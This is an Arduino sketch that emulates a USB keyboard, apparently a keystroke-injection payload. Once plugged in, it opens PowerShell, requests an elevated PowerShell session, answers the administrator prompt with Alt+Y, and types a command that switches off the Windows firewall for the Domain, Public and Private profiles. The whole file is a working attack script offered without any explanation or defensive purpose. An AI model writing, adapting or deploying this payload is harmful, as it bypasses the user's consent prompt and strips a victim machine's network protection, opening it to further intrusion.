#include <Keyboard.h> 
void setup() {
 Keyboard.begin();

  delay(500);

  
  delay(500);

  typeKey(KEY_LEFT_GUI);

  delay(500);

  Keyboard.print("powershell");
  delay(500);
  typeKey(KEY_RETURN);
 
  delay(500);
  Keyboard.print(" Start-Process powershell -Verb runAs");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(121);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
  typeKey(KEY_RETURN);

  
}
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
void loop() {
  // put your main code here, to run repeatedly:

}
